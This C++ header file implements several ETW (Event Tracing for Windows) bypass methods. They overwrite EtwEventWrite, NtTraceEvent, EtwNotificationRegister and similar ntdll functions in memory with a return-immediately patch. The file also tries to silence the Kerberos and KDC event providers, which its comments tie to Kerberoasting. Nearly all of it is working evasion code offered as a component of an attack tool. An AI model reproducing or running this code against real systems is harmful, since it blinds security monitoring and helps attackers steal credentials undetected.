#pragma once

#include <Windows.h>
#include <iostream>
#include "Helpers.h"
#include <evntprov.h>
#pragma comment(lib, "advapi32.lib")

using namespace std;

// ========================================
// Improved ETW Bypass
// ========================================

// Forward declarations
HMODULE GetModuleFromPEB(DWORD wModuleHash);

// ========================================
// Method 1: Patch EtwEventWrite (Basic)
// ========================================

inline BOOL BypassETW_Basic() {
    printf("[*] ETW Bypass Method 1: Patching EtwEventWrite...\n");

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    // Get EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] Failed to find EtwEventWrite\n");
        return FALSE;
    }

    printf("[+] EtwEventWrite found at: 0x%p\n", pEtwEventWrite);

    // Patch to return immediately (xor eax, eax; ret)
    unsigned char patch[] = {
        0x33, 0xC0,  // xor eax, eax (return 0)
        0xC3         // ret
    };

    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] EtwEventWrite patched!\n");
    return TRUE;
}

// ========================================
// Method 2: Patch Multiple ETW Functions (Improved)
// ========================================

inline BOOL BypassETW_Advanced() {
    printf("[*] ETW Bypass Method 2: Patching multiple ETW functions...\n");

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    // Patch to return 0 (success but do nothing)
    unsigned char patch[] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3         // ret
    };

    // List of ETW functions to patch
    const char* etwFunctions[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteEx",
        "EtwEventWriteString",
        "EtwEventWriteTransfer",
        "NtTraceEvent",
        "NtTraceControl"
    };

    int patchedCount = 0;

    for (int i = 0; i < sizeof(etwFunctions) / sizeof(etwFunctions[0]); i++) {
        FARPROC pFunc = GetProcAddress(hNtdll, etwFunctions[i]);

        if (!pFunc) {
            printf("[-] %s not found (might not exist on this Windows version)\n", etwFunctions[i]);
            continue;
        }

        DWORD oldProtect;
        if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            printf("[-] VirtualProtect failed for %s: %d\n", etwFunctions[i], GetLastError());
            continue;
        }

        memcpy(pFunc, patch, sizeof(patch));
        VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

        printf("[+] Patched: %s at 0x%p\n", etwFunctions[i], pFunc);
        patchedCount++;
    }

    printf("[+] Successfully patched %d ETW functions!\n", patchedCount);
    return (patchedCount > 0);
}

// ========================================
// Method 3: Disable Kerberos ETW Provider (Most Effective!)
// ========================================



inline BOOL BypassETW_DisableKerberosProvider() {
    printf("[*] ETW Bypass Method 3: Disabling Kerberos ETW Provider...\n");

    // Microsoft-Windows-Security-Kerberos Provider GUID
    GUID kerberosGuid = {
        0x6B510852, 0x3583, 0x4e2d,
        { 0xAF, 0xFE, 0xA6, 0x7F, 0x9F, 0x22, 0x34, 0x38 }
    };

    // Microsoft-Windows-Kerberos-Key-Distribution-Center Provider GUID
    GUID kdcGuid = {
        0x1BBA8B19, 0x7F31, 0x43c0,
        { 0x9C, 0x18, 0x7D, 0x66, 0xD8, 0x88, 0xE8, 0x0E }
    };

    REGHANDLE handle1 = 0, handle2 = 0;
    ULONG result1 = 0, result2 = 0;

    // Try to register and immediately unregister to disable
    result1 = EventRegister(&kerberosGuid, NULL, NULL, &handle1);
    if (result1 == ERROR_SUCCESS && handle1 != 0) {
        EventUnregister(handle1);
        printf("[+] Disabled Kerberos ETW Provider\n");
    }
    else {
        printf("[-] Failed to disable Kerberos ETW Provider: %d\n", result1);
    }

    result2 = EventRegister(&kdcGuid, NULL, NULL, &handle2);
    if (result2 == ERROR_SUCCESS && handle2 != 0) {
        EventUnregister(handle2);
        printf("[+] Disabled KDC ETW Provider\n");
    }
    else {
        printf("[-] Failed to disable KDC ETW Provider: %d\n", result2);
    }

    return (result1 == ERROR_SUCCESS || result2 == ERROR_SUCCESS);
}

// ========================================
// Method 4: Patch ETW Provider Callbacks (Advanced)
// ========================================

// Method 4: Simplified - just patch EtwNotificationRegister
// (RTL_BALANCED_LINKS is not publicly defined, so we skip the advanced method)

inline BOOL BypassETW_PatchProviderCallbacks() {
    printf("[*] ETW Bypass Method 4: Patching ETW Provider Callbacks...\n");

    // Simplified approach - patch EtwNotificationRegister

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        return FALSE;
    }

    // Get EtwNotificationRegister (used to register ETW providers)
    FARPROC pEtwNotificationRegister = GetProcAddress(hNtdll, "EtwNotificationRegister");
    if (!pEtwNotificationRegister) {
        printf("[-] EtwNotificationRegister not found\n");
        return FALSE;
    }

    // Patch to return success but do nothing
    unsigned char patch[] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3         // ret
    };

    DWORD oldProtect;
    if (!VirtualProtect(pEtwNotificationRegister, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pEtwNotificationRegister, patch, sizeof(patch));
    VirtualProtect(pEtwNotificationRegister, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] EtwNotificationRegister patched!\n");
    return TRUE;
}

// ========================================
// Comprehensive ETW Bypass (All Methods)
// ========================================

inline BOOL BypassETW_Comprehensive2() {
    printf("\n[*] ========================================\n");
    printf("[*] Comprehensive ETW Bypass Starting...\n");
    printf("[*] ========================================\n\n");

    int successCount = 0;

    // Method 1: Basic patch
    if (BypassETW_Basic()) {
        successCount++;
    }

    printf("\n");

    // Method 2: Advanced multi-function patch
    if (BypassETW_Advanced()) {
        successCount++;
    }

    printf("\n");

    // Method 3: Disable Kerberos provider (most important for kerberoast!)
    if (BypassETW_DisableKerberosProvider()) {
        successCount++;
    }

    printf("\n");

    // Method 4: Patch provider callbacks
    if (BypassETW_PatchProviderCallbacks()) {
        successCount++;
    }

    printf("\n[*] ========================================\n");
    printf("[*] ETW Bypass Complete: %d/4 methods succeeded\n", successCount);
    printf("[*] ========================================\n\n");

    return (successCount >= 2);  // At least 2 methods should succeed
}

// ========================================
// Wrapper Function (for backward compatibility)
// ========================================

inline BOOL BypassETW2() {
    // Use comprehensive bypass for maximum effectiveness
    return BypassETW_Comprehensive2();
}